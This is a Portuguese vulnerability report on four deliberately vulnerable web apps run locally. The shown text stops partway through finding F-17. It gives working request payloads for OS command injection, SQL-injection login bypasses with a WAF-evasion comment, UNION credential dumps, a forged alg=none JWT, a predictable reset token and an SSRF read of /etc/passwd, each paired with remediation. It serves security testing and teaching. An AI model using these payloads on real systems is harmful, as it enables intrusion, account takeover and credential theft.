# Relatório Formal de Vulnerabilidades — Bug Bounty

| Campo | Valor |
|---|---|
| **ID do relatório** | `BB-LAB-2026-001` |
| **Título** | Múltiplas vulnerabilidades críticas e altas em quatro aplicações web |
| **Pesquisador** | Daniel Fernandes |
| **Data da descoberta** | 26/10/2026 |
| **Data do relatório** | 26/10/2026 |
| **Versão** | 1.0 (final) |
| **Programa** | Validação interna de segurança — laboratórios locais |
| **Ativos** | `127.0.0.1:5005`, `127.0.0.1:5000`, `127.0.0.1:5003`, `127.0.0.1:3000` |
| **Severidade agregada** | **Crítica (9,8)** |
| **Status** | Validado e documentado; correções pendentes |
| **Confidencialidade** | Confidencial — partes autorizadas |

> **Aviso de escopo.** Os ativos avaliados são aplicações **intencionalmente vulneráveis**, executadas localmente e de propriedade do autor. Este documento tem finalidade de estudo, validação de ferramentas e modelo de submissão. **Não é uma submissão a programa de terceiros** e não gera direito a recompensa. Nenhum sistema externo foi acessado.

---

## 1. Resumo executivo

Quatro aplicações web foram avaliadas entre o reconhecimento e a exploração manual/automatizada. Em todas foi possível obter acesso não autorizado a dados ou comprometer a execução do servidor. O risco agregado é **Crítico**, com **cadeia comprovada de execução remota de comandos** no `dv-bookshop` a partir de um endpoint público de login.

### 1.1 Principais riscos

| # | Risco | Ativo | Impacto de negócio |
|---|---|---|---|
| 1 | RCE via injeção de comando (`/admin/ping`) | dv-bookshop | Controle total do host, exfiltração de banco e chaves, movimento lateral |
| 2 | SQLi no login com bypass de WAF | dv-bookshop | Acesso administrativo sem credenciais |
| 3 | Reset de senha previsível → account takeover | dv-bookshop | Tomada de conta de qualquer usuário, inclusive admin |
| 4 | JWT forjável (`alg=none` / segredo fraco) | dv-bookshop | Escalada para admin e vazamento de segredo |
| 5 | SQLi com bypass de autenticação | vulnshop | Acesso administrativo e dump de credenciais |
| 6 | Credenciais padrão de administrador | Juice Shop | Controle administrativo da aplicação |

### 1.2 Distribuição dos achados

| Severidade | Faixa CVSS | Qtde | Ativos |
|---|---|---|---|
| **Crítica** | 9,0 – 10,0 | 6 | dv-bookshop (4), vulnshop (1), Juice Shop (1) |
| **Alta** | 7,0 – 8,9 | 10 | dv-bookshop (6), vulnshop (3), websec-sqli (1) |
| **Média** | 4,0 – 6,9 | 13 | dv-bookshop (6), vulnshop (3), websec-sqli (1), Juice Shop (3) |
| **Baixa** | 0,1 – 3,9 | 2 | dv-bookshop (1), Juice Shop (1) |
| **Informativa** | — | 3 | dv-bookshop (2), Juice Shop (1) |
| **Total** | | **34** | |

### 1.3 Veredito

- **Exploração completa:** `dv-bookshop` e `vulnshop` (RCE, admin, dados).
- **Exposição de dados:** `websec-sqli` (senhas de todos os usuários).
- **Acesso administrativo:** Juice Shop (credenciais padrão + hash de senha no token).
- **Prioridade de correção:** os seis achados críticos devem ser tratados antes de qualquer exposição, mesmo interna.

---

## 2. Escopo e ativos

### 2.1 Ativos avaliados

| Ativo | Porta | Tecnologia | Superfície |
|---|---|---|---|
| `dv-bookshop` | 5005 | Flask 3 / SQLite | Loja, login, JWT, admin, uploads, checkout |
| `vulnshop` | 5000 | Flask / SQLite | Loja, busca, login, admin, perfil |
| `websec-sqli` | 5003 | Node/Express / `node:sqlite` | Busca de usuários (endpoint vulnerável e seguro) |
| `Juice Shop` | 3000 | Node/Express / SQLite | Loja SPA + API REST `/rest` e `/api` |

### 2.2 Contas e pré-condições utilizadas

| Ativo | Conta | Origem |
|---|---|---|
| dv-bookshop | `admin` / `SuperSecurePass2025!` | Credencial de laboratório |
| dv-bookshop | `alice_hacker` / `password123` | Credencial de laboratório |
| vulnshop | `alice` / `pass123` | Credencial de laboratório |
| Juice Shop | `admin@juice-sh.op` / `admin123` | Credencial padrão da aplicação |

### 2.3 Fora de escopo

- Infraestrutura de rede, sistema operacional do host e containers (exceto o necessário para provar o RCE).
- Engenharia social, negação de serviço e brute force prolongado.
- Dados de terceiros: todas as contas e registros são sintéticos.

---

## 3. Metodologia

### 3.1 Abordagem

1. **Reconhecimento:** `robots.txt`, mensagens de erro, headers HTTP, arquivos de backup e listagem de diretórios.
2. **Revisão de código-fonte** dos laboratórios para identificar rotas não referenciadas e confirmar causas-raiz.
3. **Teste manual com `curl`**, com cookie jars independentes por persona, para validar cada hipótese e registrar requisição/resposta.
4. **Fuzzing de contrato** com RESTler 9.3.1 e Schemathesis sobre a especificação OpenAPI do Juice Shop.
5. **Varredura passiva** com OWASP ZAP (baseline) para headers, CORS e configurações.
6. **Confirmação de impacto** com ferramentas especializadas (`jwt_tool`, `gitleaks`, `sqlite3mc`, `undark`, `sqlite_dissect`).

### 3.2 Ferramentas

| Categoria | Ferramenta |
|---|---|
| Cliente HTTP | `curl` 8.x |
| Fuzzing de API | RESTler 9.3.1, Schemathesis |
| DAST | OWASP ZAP (baseline) |
| JWT | `jwt_tool` |
| Segredos | `gitleaks` |
| SQLite/forense | `sqlite3mc`, `sqlite_dissect`, `undark`, `sqlite_carver` |
| Utilitários | Python 3.13, Node 24 |

### 3.3 Critério de classificação

CVSS 3.1 Base Score, com as faixas: Crítica ≥ 9,0; Alta 7,0–8,9; Média 4,0–6,9; Baixa 0,1–3,9; Informativa = ausência de impacto direto. Os vetores foram calculados a partir do impacto **efetivamente demonstrado**, sem encadear achados. Quando o impacto depende de uma cadeia, isso é indicado no campo "Impacto".

---

## 4. Catálogo de achados

| ID | Achado | Ativo | Sev. | CVSS | CWE |
|---|---|---|---|---|---|
| F-01 | RCE por injeção de comando em `/admin/ping` | dv-bookshop | Crítica | 9,1 | CWE-78 |
| F-02 | SQLi no login com bypass de WAF | dv-bookshop | Crítica | 9,8 | CWE-89 |
| F-03 | Token de reset previsível → account takeover | dv-bookshop | Crítica | 9,1 | CWE-330/640 |
| F-04 | JWT forjável (`alg=none` e segredo fraco) | dv-bookshop | Crítica | 9,1 | CWE-347/798 |
| F-05 | SQLi com bypass de autenticação | vulnshop | Crítica | 9,8 | CWE-89 |
| F-06 | Credenciais padrão de administrador | Juice Shop | Crítica | 9,8 | CWE-1392 |
| F-07 | `/debug_db` sem autenticação expõe PII, senhas e cartões | dv-bookshop | Alta | 7,5 | CWE-306/200 |
| F-08 | Backup de código exposto (`/app.py.bak`) | dv-bookshop | Alta | 7,5 | CWE-538/540 |
| F-09 | IDOR sem autenticação em `/api/user/<id>/card` | dv-bookshop | Alta | 7,5 | CWE-639/306 |
| F-10 | Debugger Werkzeug ativo (`debug=True`) e `/console` acessível | dv-bookshop | Alta | 7,5 | CWE-489/215 |
| F-11 | SQLi UNION em `/book_details` | dv-bookshop | Alta | 7,5 | CWE-89 |
| F-12 | Senhas armazenadas em texto plano | dv-bookshop | Alta | 7,5 | CWE-256/522 |
| F-13 | SQLi com dump de credenciais em `/products?id=` | vulnshop | Alta | 7,5 | CWE-89 |
| F-14 | Broken access control em `/admin` | vulnshop | Alta | 8,1 | CWE-284/862 |
| F-15 | Debugger Werkzeug exposto | vulnshop | Alta | 7,5 | CWE-489/215 |
| F-16 | SQLi em `/search/vulnerable` expõe senhas | websec-sqli | Alta | 7,5 | CWE-89 |
| F-17 | SSRF com leitura de arquivos locais | dv-bookshop | Média | 6,8 | CWE-918/22 |
| F-18 | XSS refletido na busca | dv-bookshop | Média | 6,1 | CWE-79 |
| F-19 | IDOR em `/profile?user_id=` | dv-bookshop | Média | 6,5 | CWE-639 |
| F-20 | IDOR em recibos `/download_receipt/<id>` | dv-bookshop | Média | 6,5 | CWE-639 |
| F-21 | Manipulação de preço no checkout | dv-bookshop | Média | 6,5 | CWE-472 |
| F-22 | Ausência de rate limit/lockout no login | dv-bookshop | Média | 5,3 | CWE-307 |
| F-23 | XSS refletido em `/search?q=` | vulnshop | Média | 6,1 | CWE-79 |
| F-24 | CSRF em `/profile` | vulnshop | Média | 6,5 | CWE-352 |
| F-25 | Ausência de lockout e senhas fracas | vulnshop | Média | 5,3 | CWE-307/521 |
| F-26 | 500 com stack trace e caminhos internos | Juice Shop | Média | 5,3 | CWE-209 |
| F-27 | CORS permissivo (`Access-Control-Allow-Origin: *`) | Juice Shop | Média | 5,3 | CWE-942 |
| F-28 | CSP ausente e headers de isolamento incompletos | Juice Shop | Média | 5,4 | CWE-693 |
| F-29 | `/security-events` expõe logs de ataque sem autenticação | websec-sqli | Média | 5,3 | CWE-532 |
| F-30 | Open redirect | dv-bookshop | Baixa | 4,3 | CWE-601 |
| F-31 | Hash MD5 não salgado da senha dentro do JWT | Juice Shop | Baixa | 4,3 | CWE-522/916 |
| F-32 | Listagem de diretório em `/uploads` | dv-bookshop | Info | — | CWE-548 |
| F-33 | `robots.txt` revela rotas administrativas | dv-bookshop | Info | — | CWE-200 |
| F-34 | Status 401 não documentado no contrato | Juice Shop | Info | — | CWE-1059 |

---

## 5. Achados críticos (detalhados)

### F-01 — Execução remota de comandos por injeção em `/admin/ping`

| Campo | Valor |
|---|---|
| **Severidade** | Crítica |
| **CVSS 3.1** | **9,1** — `CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H` |
| **CWE** | CWE-78 (OS Command Injection) |
| **OWASP** | A03:2021 — Injection |
| **Ativo** | `http://127.0.0.1:5005` |
| **Endpoint** | `POST /admin/ping` |
| **Parâmetro** | `host` (form) |

**Pré-condições.** Sessão administrativa. Obtenível sem credenciais via F-02, F-03 ou F-04.

**Descrição.** O endpoint monta o comando `ping -c 2 <host>` e o executa com `shell=True`, sem validação. Caracteres de controle (`;`, `|`, `$()`) permitem anexar comandos arbitrários.

**Passos para reprodução.**

1. Obter sessão de admin (F-02):
   ```bash
   curl -c /tmp/admin.jar -X POST http://127.0.0.1:5005/login \
        --data-urlencode "username=admin' OR 1=1 /*!50000" \
        --data-urlencode "password=x"
   ```
2. Enviar o payload:
   ```http
   POST /admin/ping HTTP/1.1
   Host: 127.0.0.1:5005
   Cookie: session=<sessão-admin>
   Content-Type: application/x-www-form-urlencoded

   host=127.0.0.1%3B+id%3B+uname+-a
   ```
3. Observar a saída do comando na resposta.

**Evidência.**

```text
uid=1001(daniel) gid=1001(daniel) grupos=1001(daniel),100(users)
Linux vostro 6.12.111+deb13-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.12.111-1 (2026-09-28) x86_64 GNU/Linux
```

Arquivo: `labs/artifacts/attack/rce.txt`.

**Impacto.** Execução de comandos com o usuário do processo: leitura/gravação de arquivos, acesso ao banco (`users.db`, `bookshop.db`), extração de segredos (`app.secret_key`, `JWT_SECRET`), pivot para o host e possível movimento lateral. Em produção, equivale ao comprometimento total do servidor.

**Remediação.**
- Remover `shell=True` e passar argumentos em lista (`subprocess.run(["ping","-c","2",host])`).
- Validar `host` com allowlist estrita (IPv4/IPv6 ou FQDN), sem metacaracteres.
- Aplicar timeout e executar com usuário de serviço sem privilégios.
- Restringir o endpoint a redes administrativas e exigir reautenticação/MFA.

**Referências.** OWASP Command Injection; CWE-78; PortSwigger — OS command injection.

---

### F-02 — SQL injection no login com bypass de WAF

| Campo | Valor |
|---|---|
| **Severidade** | Crítica |
| **CVSS 3.1** | **9,8** — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| **CWE** | CWE-89 (SQL Injection) |
| **OWASP** | A03:2021 — Injection |
| **Ativo** | `http://127.0.0.1:5005` |
| **Endpoint** | `POST /login` |
| **Parâmetros** | `username`, `password` |

**Pré-condições.** Nenhuma. Endpoint público.

**Descrição.** Quando a consulta parametrizada não retorna usuário, a aplicação executa uma segunda consulta concatenando a entrada. O WAF baseado em blacklist é desativado se a entrada contiver a sequência `/*!50000`, e o comentário SQL aberto permite truncar a cláusula de senha.

**Passos para reprodução.**

1. Enviar credenciais com injeção:
   ```http
   POST /login HTTP/1.1
   Host: 127.0.0.1:5005
   Content-Type: application/x-www-form-urlencoded

   username=admin%27+OR+1%3D1+%2F*%2150000&password=x
   ```
2. A resposta é `302 Found` com `Location: /`.
3. Confirmar o acesso administrativo:
   ```bash
   curl -b /tmp/admin.jar -o /dev/null -w "%{http_code}" http://127.0.0.1:5005/admin
   # 200
   ```

**Evidência.** `302 → /` seguido de `GET /admin = 200` e página "Admin Dashboard".
Controle negativo: `username=admin' -- ` retorna "WAF Detection: Potential SQL injection detected!" e não autentica; o payload acima contorna o filtro.

**Impacto.** Autenticação como o primeiro registro da tabela (admin) sem senha. Habilita todos os endpoints administrativos, incluindo F-01 e F-17.

**Remediação.**
- Eliminar o caminho de consulta concatenada; usar exclusivamente prepared statements.
- Não usar WAF como controle primário; validar tipo/tamanho e rejeitar metacaracteres.
- Bloquear comentários SQL e aplicar rate limit no login.

**Referências.** OWASP SQL Injection; CWE-89; OWASP WAF bypass.

---

### F-03 — Token de reset previsível leva a account takeover

| Campo | Valor |
|---|---|
| **Severidade** | Crítica |
| **CVSS 3.1** | **9,1** — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N` |
| **CWE** | CWE-330 (Insufficiently Random Values), CWE-640 (Weak Password Recovery) |
| **OWASP** | A07:2021 — Identification and Authentication Failures |
| **Ativo** | `http://127.0.0.1:5005` |
| **Endpoints** | `POST /forgot_password`, `POST /reset_password/<token>` |

**Pré-condições.** Conhecer o username da vítima (enumerável em F-33/F-02).

**Descrição.** O token é `md5(username + STATIC_RESET_SECRET)`, com segredo estático `khitminnyo2025` embutido no código. Além disso, a resposta de `/forgot_password` exibe o link de reset na mensagem flash, eliminando até a necessidade de previsão.

**Passos para reprodução.**

1. Calcular o token para `admin`:
   ```bash
   python3 -c "import hashlib;print(hashlib.md5(b'adminkhitminnyo2025').hexdigest())"
   # efa8a34e635b548419e13022e9cbb724
   ```
2. Solicitar o reset (a resposta já revela o token):
   ```http
   POST /forgot_password HTTP/1.1
   Host: 127.0.0.1:5005
   Content-Type: application/x-www-form-urlencoded

   username=admin
   ```
   Trecho da resposta: `/reset_password/efa8a34e635b548419e13022e9cbb724`.
3. Redefinir a senha:
   ```http
   POST /reset_password/efa8a34e635b548419e13022e9cbb724 HTTP/1.1
   Host: 127.0.0.1:5005
   Content-Type: application/x-www-form-urlencoded

   password=Owned123%21
   ```
4. Autenticar com a nova senha: `302 → /` e `GET /admin = 200`.

**Impacto.** Tomada de conta de qualquer usuário, inclusive administrador, sem acesso ao e-mail. Permite perseguição (novo reset), fraude e acesso a dados.

**Remediação.**
- Token aleatório com CSPRNG (≥128 bits), de uso único, com validade curta (≤15 min).
- Armazenar apenas o hash do token e vinculá-lo ao usuário.
- Entregar somente por e-mail; nunca exibir na resposta HTTP.
- Invalidar todas as sessões após o reset e notificar o usuário.

**Referências.** OWASP Forgot Password; CWE-640.

---

### F-04 — JWT forjável: `alg=none` aceito e segredo HS256 fraco

| Campo | Valor |
|---|---|
| **Severidade** | Crítica |
| **CVSS 3.1** | **9,1** — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N` |
| **CWE** | CWE-347 (Improper Verification of Cryptographic Signature), CWE-798 |
| **OWASP** | A02:2021 — Cryptographic Failures / A07:2021 |
| **Ativo** | `http://127.0.0.1:5005` |
| **Endpoint** | `GET /api/jwt/admin` |
| **Header** | `Authorization: Bearer <JWT>` |

**Pré-condições.** Nenhuma credencial; basta gerar um token.

**Descrição.** O decodificador confia no campo `alg` do header. Tokens `alg=none` são aceitos sem assinatura e tokens HS256 são validados com o segredo `secret`, presente no código.

**Passos para reprodução.**

1. Gerar token não assinado:
   ```json
   {"alg":"none","typ":"JWT"}
   {"sub":2,"username":"alice_hacker","role":"admin"}
   ```
2. Enviar:
   ```http
   GET /api/jwt/admin HTTP/1.1
   Host: 127.0.0.1:5005
   Authorization: Bearer <header>.<payload>.
   ```
3. Repetir com HS256 assinado por `secret`; ambos retornam o mesmo conteúdo.

**Evidência.**

```json
{
  "flag": "CTF{Bl1nd_SQL1_M4st3r_T1m3_B4s3d_2025}",
  "message": "Welcome, admin."
}
```

Controle: token com `"role":"user"` retorna `{"error":"Admin role required"}`.

**Impacto.** Escalada de privilégio para administrador e exposição do `secret_note`/flag do admin. Em um sistema real, permitiria personificar qualquer usuário e acessar funções administrativas.

**Remediação.**
- Fixar o algoritmo esperado (`HS256` ou `RS256`) e rejeitar `none` e algoritmos não previstos.
- Segredo aleatório ≥256 bits em variável de ambiente/secret manager, com rotação.
- Validar `exp`, `nbf`, `iss`, `aud` e revogação.
- Autorizar pelo usuário no banco, não apenas pelo claim `role`.

**Referências.** OWASP JWT Cheat Sheet; CWE-347; RFC 8725.

---

### F-05 — SQL injection com bypass de autenticação (vulnshop)

| Campo | Valor |
|---|---|
| **Severidade** | Crítica |
| **CVSS 3.1** | **9,8** — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| **CWE** | CWE-89 |
| **OWASP** | A03:2021 — Injection |
| **Ativo** | `http://127.0.0.1:5000` |
| **Endpoint** | `POST /login` |

**Pré-condições.** Nenhuma.

**Descrição.** A consulta é montada por concatenação de strings com os campos do formulário, permitindo alterar a cláusula `WHERE`.

**Passos para reprodução.**

```http
POST /login HTTP/1.1
Host: 127.0.0.1:5000
Content-Type: application/x-www-form-urlencoded

username=%27+OR+%271%27%3D%271%27+--+&password=x
```

Resposta `302 Found → /`, autenticado como o primeiro usuário (`admin`).

**Evidência.** Sessão criada e acesso a `/admin` (F-14) com o papel de administrador.
Arquivo: `labs/artifacts/attack/vs-bac.txt`.

**Impacto.** Acesso administrativo sem credenciais e, combinado com F-13, dump completo de credenciais.

**Remediação.** Prepared statements; validação de entrada; mensagens de erro genéricas; MFA para admin.

**Referências.** OWASP SQL Injection; CWE-89.

---

### F-06 — Credenciais padrão de administrador (Juice Shop)

| Campo | Valor |
|---|---|
| **Severidade** | Crítica |
| **CVSS 3.1** | **9,8** — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| **CWE** | CWE-1392 (Use of Default Credentials), CWE-521 |
| **OWASP** | A07:2021 — Identification and Authentication Failures |
| **Ativo** | `http://127.0.0.1:3000` |
| **Endpoint** | `POST /rest/user/login` |

**Pré-condições.** Nenhuma.

**Descrição.** A conta administrativa mantém a credencial padrão `admin@juice-sh.op` / `admin123`.

**Passos para reprodução.**

```http
POST /rest/user/login HTTP/1.1
Host: 127.0.0.1:3000
Content-Type: application/json

{"email":"admin@juice-sh.op","password":"admin123"}
```

Resposta `200 OK` com JWT de `role: admin`. Com o token, `GET /api/Users` retorna **23 usuários**.

**Evidência.** JWT emitido (`/tmp/opencode/js-admin.jwt`); payload com `"role":"admin"`; listagem de 23 contas.

**Impacto.** Controle administrativo total: gestão de usuários, pedidos, produtos e configurações.

**Remediação.** Forçar troca de senha no primeiro acesso; desativar contas padrão; política de senha forte; MFA; monitorar logins de admin.

**Referências.** OWASP Authentication Cheat Sheet; CWE-1392.

---

## 6. Achados altos (detalhados)

### F-07 — `/debug_db` sem autenticação expõe PII, senhas, cartões e segredo

| Campo | Valor |
|---|---|
| **Severidade** | Alta |
| **CVSS 3.1** | **7,5** — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` |
| **CWE** | CWE-306 (Missing Authentication), CWE-200 |
| **Ativo** | `http://127.0.0.1:5005` |
| **Endpoint** | `GET /debug_db` |

**Descrição.** Rota de depuração pública que executa `SELECT username, email, password, secret_note, credit_card_number FROM users` e devolve o resultado em HTML.

**Reprodução.**

```http
GET /debug_db HTTP/1.1
Host: 127.0.0.1:5005
```

**Evidência (trecho).**

```text
User: admin | Email: admin@bookshop.com | Pass: SuperSecurePass2025! | Card: 4532-0000-0000-0001 | Note: CTF{...}
User: alice_hacker | Email: alice@hack.com | Pass: password123 | Card: 4532-1234-5678-9012 | Note: ...
```

Arquivo: `labs/artifacts/attack/debug_db.txt`.

**Impacto.** Vazamento de credenciais em texto plano, PII, PAN de cartão (PCI DSS) e segredo do admin, sem autenticação.

**Remediação.** Remover a rota do build; exigir autenticação e autorização; nunca retornar senhas; mascarar cartões; auditar acessos.

---

### F-08 — Backup de código exposto (`/app.py.bak`)

| Campo | Valor |
|---|---|
| **Severidade** | Alta |
| **CVSS 3.1** | **7,5** — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` |
| **CWE** | CWE-538 (File and Directory Information Exposure), CWE-540 |
| **Ativo** | `http://127.0.0.1:5005` |
| **Endpoint** | `GET /app.py.bak` |

**Descrição.** O servidor entrega um backup do código-fonte (83.994 bytes) contendo `app.secret_key`, `JWT_SECRET`, `STATIC_RESET_SECRET` e o mapa de rotas administrativas.

**Reprodução.**

```http
GET /app.py.bak HTTP/1.1
Host: 127.0.0.1:5005
```

Resposta `200 OK`, `Content-Length: 83994`.

**Impacto.** Divulgação de segredos e da lógica interna; reduz o esforço de exploração de F-01, F-03 e F-04 a praticamente zero.

**Remediação.** Não publicar fontes/backups; bloquear extensões `*.bak`, `*.old`, `*.orig`, `*.zip`; mover segredos para cofre; revisar o diretório público.

---

### F-09 — IDOR sem autenticação em `/api/user/<id>/card`

| Campo | Valor |
|---|---|
| **Severidade** | Alta |
| **CVSS 3.1** | **7,5** — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` |
| **CWE** | CWE-639, CWE-306 |
| **Ativo** | `http://127.0.0.1:5005` |
| **Endpoint** | `GET /api/user/<id>/card` |

**Descrição.** O endpoint retorna número e validade do cartão de qualquer usuário, sem autenticação e sem verificar propriedade.

**Reprodução.**

```http
GET /api/user/1/card HTTP/1.1
Host: 127.0.0.1:5005
```

**Evidência.**

```json
{"card_expiry":"12/27","card_number":"4532-0000-0000-0001","username":"admin"}
```

Arquivo: `labs/artifacts/attack/card-idor.json`.

**Impacto.** Enumeração de IDs (1..20) expõe dados de cartão de todos os clientes — fraude, violação de PCI DSS e LGPD.

**Remediação.** Exigir autenticação; autorizar por objeto (`session.user_id == id` ou admin); retornar apenas os 4 últimos dígitos; rate limit e auditoria.

---

### F-10 — Debugger Werkzeug ativo e `/console` acessível

| Campo | Valor |
|---|---|
| **Severidade** | Alta |
| **CVSS 3.1** | **7,5** — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` |
| **CWE** | CWE-489 (Active Debug Code), CWE-215 |
| **Ativo** | `http://127.0.0.1:5005` |
| **Endpoints** | `/console`, páginas de erro |

**Descrição.** A aplicação é iniciada com `debug=True` e `host='0.0.0.0'`. O console do Werkzeug responde `200` e as páginas de erro revelam traceback, trechos de código e o `SECRET` do console.

**Reprodução.**

```http
GET /console HTTP/1.1
Host: 127.0.0.1:5005
```

Resposta `200 OK` (`<title>Console // Werkzeug Debugger</title>`).

**Impacto.** Vazamento de código/segredos. Se o PIN do console for obtido ou derivado, permite execução de Python no servidor (RCE), sem depender de F-01. Pontuação conservadora de 7,5 pelo impacto confirmado (divulgação); a escalada eleva o risco a crítico.

**Remediação.** `debug=False`; servir com WSGI de produção (gunicorn/uwsgi); remover `/console`; restringir por IP e autenticação.

---

### F-11 — SQLi UNION em `/book_details`

| Campo | Valor |
|---|---|
| **Severidade** | Alta |
| **CVSS 3.1** | **7,5** — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` |
| **CWE** | CWE-89 |
| **Ativo** | `http://127.0.0.1:5005` |
| **Endpoint** | `GET /book_details?id=` |

**Descrição.** O parâmetro `id` é interpolado na consulta. O WAF é contornado com `/*!50000` e o mesmo trecho é removido antes da execução, permitindo `UNION SELECT`.

**Reprodução.**

```http
GET /book_details?id=0%20UNION%20SELECT%201,action,details,1,1,1,1,1%20FROM%20admin_logs%20/*!50000 HTTP/1.1
Host: 127.0.0.1:5005
```

**Evidência.** A página exibe o conteúdo de `admin_logs`, incluindo o comando injetado em F-01:
`Host: 127.0.0.1; id; uname -a`.
Erro-based: `id=1'` → `SQL Error: unrecognized token: "'"`.
Arquivo: `labs/artifacts/attack/dv-sqli-union.txt`.

**Impacto.** Leitura arbitrária das tabelas da loja (`admin_logs`, `orders`, `support_tickets`) e enumeração de esquema via `sqlite_master`; mensagens de erro auxiliam injeções cegas.

**Remediação.** Prepared statements; validar `id` como inteiro; não exibir erros do banco; desativar debug.

---

### F-12 — Senhas armazenadas em texto plano

| Campo | Valor |
|---|---|
| **Severidade** | Alta |
| **CVSS 3.1** | **7,5** — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` |
| **CWE** | CWE-256 (Plaintext Storage of a Password), CWE-522 |
| **Ativo** | `dv-bookshop` (SQLite `users.db`) |

**Descrição.** A coluna `password` armazena a senha em claro (`SuperSecurePass2025!`, `password123`, `bob2025secure`), confirmado pelo `/debug_db` e pela leitura direta do banco.

**Impacto.** Qualquer leitura do arquivo (backup, LFI, RCE, cópia indevida) entrega todas as credenciais; o reuso de senha amplia o comprometimento para outros sistemas.

**Remediação.** Migrar para Argon2id/bcrypt com salt único; forçar reset; nunca registrar senhas em logs; restringir permissões do arquivo.

---

### F-13 — SQL injection com dump de credenciais (vulnshop)

| Campo | Valor |
|---|---|
| **Severidade** | Alta |
| **CVSS 3.1** | **7,5** — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` |
| **CWE** | CWE-89 |
| **Ativo** | `http://127.0.0.1:5000` |
| **Endpoint** | `GET /products?id=` |

**Descrição.** `id` é interpolado diretamente em `SELECT * FROM products WHERE id = {pid}`, permitindo `UNION` com a tabela `users`.

**Reprodução.**

```http
GET /products?id=0%20UNION%20SELECT%200,username,0,password%20FROM%20users HTTP/1.1
Host: 127.0.0.1:5000
```

**Evidência.**

```text
admin / admin123
alice / pass123
bob   / bob456
```

Arquivo: `labs/artifacts/attack/vs-sqli-union.txt`.

**Impacto.** Exposição de todas as credenciais (texto plano) por endpoint público; combinado com F-05/F-14, leva ao controle administrativo.

**Remediação.** Prepared statements; validar inteiro; retornar somente colunas necessárias; hash forte de senhas.

---

### F-14 — Broken access control em `/admin`

| Campo | Valor |
|---|---|
| **Severidade** | Alta |
| **CVSS 3.1** | **8,1** — `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N` |
| **CWE** | CWE-284, CWE-862 (Missing Authorization) |
| **Ativo** | `http://127.0.0.1:5000` |
| **Endpoint** | `GET /admin` |

**Descrição.** O painel administrativo não verifica o papel do usuário autenticado.

**Reprodução.**

1. Autenticar como usuária comum:
   ```bash
   curl -c /tmp/vs.jar -X POST http://127.0.0.1:5000/login \
        -d "username=alice&password=pass123"
   ```
2. Acessar o painel:
   ```http
   GET /admin HTTP/1.1
   Host: 127.0.0.1:5000
   Cookie: session=<sessão-de-alice>
   ```
   Resposta `200 OK`.

**Evidência.** A página lista todos os usuários, incluindo `admin@shop.com` / `admin123`.
Arquivo: `labs/artifacts/attack/vs-bac.txt`.

**Impacto.** Escalada de privilégio horizontal/vertical e exposição de credenciais administrativas.

**Remediação.** Middleware de autorização baseado em papel; `abort(403)` para não-admin; nunca renderizar senhas; auditar acessos.

---

### F-15 — Debugger Werkzeug exposto (vulnshop)

| Campo | Valor |
|---|---|
| **Severidade** | Alta |
| **CVSS 3.1** | **7,5** — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` |
| **CWE** | CWE-489, CWE-215 |
| **Ativo** | `http://127.0.0.1:5000` |

**Descrição.** A aplicação roda com `debug=True`. Uma exceção provocada por `GET /products?id=abc` renderiza o Werkzeug Debugger com traceback, código-fonte e `SECRET = "KKcnTvd0eTDi3HTXr39F"`.

**Evidência.** Arquivo `labs/artifacts/attack/vs-debugger.txt` (Werkzeug Debugger, Traceback e SECRET).

**Impacto.** Divulgação de código/segredos e potencial RCE via console interativo.

**Remediação.** `debug=False`; servidor WSGI de produção; tratar exceções sem stack trace.

---

### F-16 — SQL injection em `/search/vulnerable` expõe senhas

| Campo | Valor |
|---|---|
| **Severidade** | Alta |
| **CVSS 3.1** | **7,5** — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` |
| **CWE** | CWE-89 |
| **Ativo** | `http://127.0.0.1:5003` |
| **Endpoint** | `GET /search/vulnerable?username=` |

**Descrição.** O serviço concatena `username` na consulta. Um `UNION` desloca a coluna `password` para o campo `email` da resposta.

**Reprodução.**

```http
GET /search/vulnerable?username=none%27%20UNION%20SELECT%20id,username,password,is_admin%20FROM%20users-- HTTP/1.1
Host: 127.0.0.1:5003
```

**Evidência.**

```json
{"users":[
  {"id":1,"username":"admin","email":"AdminPass123!","isAdmin":1},
  {"id":2,"username":"user1","email":"UserPass123!","isAdmin":0},
  {"id":3,"username":"moderator","email":"ModPass123!","isAdmin":0}]}
```

Arquivo: `labs/artifacts/attack/ws-sqli.json`.

**Impacto.** Dump de credenciais e identificação de contas administrativas por endpoint público.

**Remediação.** Usar o padrão já presente em `/search/secure`: validação `^[a-zA-Z0-9_]+$`, limite de 30 caracteres e query parametrizada. Confirmado: `/search/secure` retorna `400 VALIDATION_ERROR` para o mesmo payload.

---

## 7. Achados médios

### F-17 — SSRF com leitura de arquivos locais (`/admin/preview_url`)

- **CVSS 3.1:** 6,8 — `CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:N/A:N` · **CWE-918 / CWE-22** · **Ativo:** dv-bookshop · **Pré-condição:** admin (F-02/F-03/F-04).
- **Descrição:** `urlopen(url)` sem allowlist de esquema/host aceita `file://` e destinos internos.
- **Reprodução:**
  ```http
  POST /admin/preview_url HTTP/1.1
  Host: 127.0.0.1:5005

  url=file:///etc/passwd
  ```
